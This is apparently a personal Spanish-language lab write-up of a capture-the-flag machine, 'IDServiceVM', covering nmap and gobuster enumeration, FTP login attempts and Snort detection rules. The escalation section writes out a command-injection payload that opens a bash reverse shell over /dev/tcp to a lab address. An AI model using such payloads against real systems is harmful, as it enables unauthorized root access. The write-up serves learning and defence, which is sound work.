# 🛡️ Reto de Ciberseguridad: Intrusión y Defensa en "IDServiceVM"

> Documentación personal del reto de ciberseguridad en entorno controlado. Este archivo recoge paso a paso el análisis, ataques, accesos, escalada de privilegios y defensa con reglas IDS. Contiene explicaciones y comandos clave para futuras referencias.

---

## 🎯 Objetivos del reto

1. **Acceso Inicial Múltiple:**

   * Acceder a la máquina víctima por **FTP** subiendo una shell web.
   * Acceder por **SSH** con las mismas credenciales.

2. **Escalada de privilegios:**

   * Elevar privilegios hasta obtener una shell como `root`.

3. **Defensa y Detección (Blue Team):**

   * Crear reglas Snort para detectar vectores de ataque utilizados.

---

## 🧩 Fase 1: Reconocimiento y Acceso Inicial

### 🔌 1.1 Configuración de red

* Tipo de red usada: **Red NAT personalizada (Red NAT de VirtualBox)**.
* Ambas VMs (Kali + IDServiceVM) conectadas a la misma red virtual.

### 🔎 1.2 Descubrimiento de IP

```bash
sudo nmap -sn 10.0.2.0/24
```

* Se identificó la IP de la víctima: `10.0.2.10`
* MAC: Oracle VirtualBox NIC

### 📡 1.3 Escaneo de puertos

```bash
sudo nmap -sS -p- 10.0.2.10
```

* Puertos abiertos:

  * `21` FTP
  * `22` SSH
  * `80` HTTP
  * `5011` Servicio desconocido (posiblemente vulnerable)

### 📜 1.4 Enumeración de servicios

```bash
sudo nmap -sV -sC 10.0.2.10
```

* Servicios detectados:

  * **FTP:** vsftpd 3.0.5
  * **SSH:** OpenSSH 8.9p1 (Ubuntu)
  * **HTTP:** Apache 2.4.52 (Ubuntu)
* Detalles adicionales:

  * `/robots.txt` bloquea la ruta `/prod`
  * Página web por defecto activa

➡️ Se intentó login anónimo en FTP:

```bash
ftp 10.0.2.10
Name: anonymous
Password: cualquier
```

❌ Resultado: **Login incorrecto. Anónimo no permitido.**

🔚 Para salir del modo `ftp>` en la terminal:

```bash
bye
```

o simplemente:

```bash
exit
```

🧩 **Observación importante:**
Al ejecutar simplemente:

```bash
ftp 10.0.2.10
```

Desde Kali, se detectó que en la máquina víctima apareció un nuevo usuario llamado **`basicftp`**, el cual no existía inicialmente. Esto sugiere que el sistema está diseñado para **crear dinámicamente un usuario FTP** al recibir una conexión, posiblemente como parte del flujo del reto.

➡️ **Próximo paso:** intentar conectarse al FTP como `basicftp` con contraseñas comunes como `basicftp`, `ftp123`, `password`, etc.

---

## 🌐 Anexo: Peticiones típicas por protocolo (Banner Grabbing)

Cuando Nmap o un pentester analiza un puerto, envía "peticiones típicas" según el protocolo para identificar el servicio. Esto permite hacer **banner grabbing**, es decir, obtener información útil como nombre del servicio, versión y sistema operativo.

### 🔹 HTTP (puerto 80, 8080, 8000)

Petición:

```http
GET / HTTP/1.1
Host: 10.0.2.10
```

Respuesta esperada:

```http
HTTP/1.1 200 OK
Server: Apache/2.4.18 (Ubuntu)
```

### 🔹 FTP (puerto 21)

Petición (automática al conectar):

```text
220 (vsFTPd 3.0.5)
```

### 🔹 SSH (puerto 22)

Banner enviado por el servidor al conectar:

```text
SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.1
```

### 🔹 SMTP (puerto 25)

Petición:

```text
EHLO kali.local
```

Respuesta:

```text
250-smtp.example.com Hello
250-STARTTLS
250-AUTH LOGIN PLAIN
```

### 🔹 DNS (puerto 53)

Consulta típica:

```bash
dig @10.0.2.10 example.com
```

📌 Estas respuestas permiten:

* Confirmar qué servicio corre en un puerto
* Detectar versiones vulnerables
* Crear reglas IDS específicas

---

## 🔎 Anexo: Uso de Gobuster y Wordlists

### 🛠️ ¿Qué es Gobuster?

Gobuster es una herramienta de fuerza bruta que permite enumerar directorios y archivos ocultos en servidores web.

### 📁 ¿Qué son las Wordlists?

Las **wordlists** son listas de palabras o nombres comunes de archivos y carpetas. Se usan para lanzar peticiones contra el servidor y ver si alguno existe.

📂 Ejemplo de wordlist común:

```
admin
backup
robots.txt
config.php
```

### 🧪 Ejemplo práctico:

```bash
gobuster dir -u http://10.0.2.10 -w /usr/share/wordlists/dirb/common.txt
```

* `dir` → modo de búsqueda de directorios
* `-u` → URL objetivo
* `-w` → wordlist que se utilizará

### ✅ Resultados comunes detectados:

```text
/.htaccess         (403) → Archivo de configuración de Apache, oculto y sensible
/.hta              (403) → Archivo oculto que puede contener scripts en sistemas Windows
/.htpasswd         (403) → Archivo que contiene contraseñas cifradas
/index.html        (200) → Página principal
/prod              (301) → Redirección a /prod/ (directorio útil)
/robots.txt        (200) → Archivo de instrucciones para bots; puede revelar rutas ocultas
/server-status     (403) → Página del módulo de monitoreo de Apache (normalmente bloqueada)
```

### 📁 Rutas adicionales:

```bash
ls /usr/share/wordlists/
```

* Wordlists destacadas:

  * `rockyou.txt.gz` (comprimida, famosa para fuerza bruta de contraseñas)
  * `dirb/common.txt` (básica para descubrimiento web)
  * `dirbuster/directory-list-2.3-medium.txt` (más extensa)

### ⚠️ ¿Por qué `rockyou.txt.gz` aparece en rojo?

Significa que el archivo pertenece a **root** y no puede ser manipulado por usuarios sin privilegios.

Para usarla:

```bash
cp /usr/share/wordlists/rockyou.txt.gz ~/rockyou.txt.gz
gunzip rockyou.txt.gz
```

---

## 🌐 1.5 Enumeración Web

```bash
gobuster dir -u http://10.0.2.10 -w /usr/share/wordlists/dirb/common.txt
gobuster dir -u http://10.0.2.10 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

* Búsqueda de archivos sensibles: `README`, `config.php`, `.git`, etc.
* Exploración de `/robots.txt`:

```bash
curl http://10.0.2.10/robots.txt
```

➡️ Revela que `/prod` está oculto.

* Intentar acceder a `/prod`:

```bash
curl http://10.0.2.10/prod/
gobuster dir -u http://10.0.2.10/prod/ -w /usr/share/wordlists/dirb/common.txt
```

➡️ Detectado: `/static/`, `.git/HEAD`

### 🐚 1.6 Acceso FTP + Web Shell

❌ Acceso anónimo denegado. Pendiente de búsqueda de credenciales válidas para FTP.
➡️ **Posible usuario descubierto:** `basicftp` (pendiente de prueba)

### 🐚 1.7 Acceso SSH

❌ Acceso no probado aún. Requiere descubrimiento de credenciales.

---

## 🔐 Fase 2: Escalada de Privilegios

### 🧠 2.1 Enumeración interna

```bash
whoami
sudo -l
find / -perm -4000 2>/dev/null
ps aux | grep root
cat /etc/crontab
```

### 🔍 2.2 Análisis de scripts

* Revisar scripts ejecutados por cron o root.
* Buscar comandos con entradas no sanitizadas.

### 💣 2.3 Explotación

Ejemplo:

```bash
echo '$(/bin/bash -i >& /dev/tcp/10.0.2.15/4445 0>&1)' > /etc/backup-files.txt
```

Y en Kali:

```bash
nc -lvnp 4445
```

➡️ Shell como root obtenida.

---

## 🔒 Fase 3: Defensa y Detección (IDS - Snort)

### 🧷 Reglas creadas:

#### 1. Acceso a archivo sensible por HTTP

```snort
alert tcp any any -> any 80 (msg:"[ALERTA] Acceso a archivo sensible"; content:"README"; http_uri; nocase; sid:100001;)
```

#### 2. Subida de archivos por FTP

```snort
alert tcp any any -> any 21 (msg:"[ALERTA] Subida de archivo por FTP"; content:"STOR"; nocase; sid:100002;)
```

#### 3. Conexión SSH detectada

```snort
alert tcp any any -> any 22 (msg:"[ALERTA] Conexión SSH detectada"; flags:S; sid:100003;)
```

#### 4. Inyección de comandos por URL

```snort
alert tcp any any -> any 80 (msg:"[ALERTA] Inyección de comandos"; content:";cat"; http_uri; nocase; sid:100004;)
```

---

## 📘 Observaciones y Notas personales

* Recordar revisar `robots.txt` y `.git` en enumeraciones web.
* Los puertos altos (>1024) pueden ser servicios web alternativos.
* Usar `searchsploit` para encontrar CVEs por versión:

  ```bash
  searchsploit apache 2.4.18
  ```
* Snort es muy potente, pero también sensible a falsos positivos.
* Documentar todo siempre ayuda a ganar velocidad en futuras auditorías.
* Las peticiones típicas de protocolo permiten identificar servicios sin necesidad de vulnerarlos. Ideal para red team y blue team.

---

## ✅ Estado del reto

* [x] Identificación de la IP de la víctima
* [x] Escaneo de puertos y versiones
* [x] Banner grabbing y mapeo de servicios
* [x] Descarga de .git con Git-Dumper
* [x] Análisis de `/prod` y `/static`
* [x] Uso de Gobuster con wordlists y análisis de resultados
* [ ] Acceso FTP (denegado a anonymous, pero nuevo usuario detectado)
* [ ] Acceso SSH (pendiente de credenciales)
* [ ] Webshell o vector inicial (pendiente de análisis web profundo)
* [ ] Escalada de privilegios
* [ ] Reglas IDS funcionales

---

**Fin del documento**
📁 Archivo de uso personal para repaso, replicación o actualización futura.


****
sualba.dev © 2025 - Todos los derechos reservados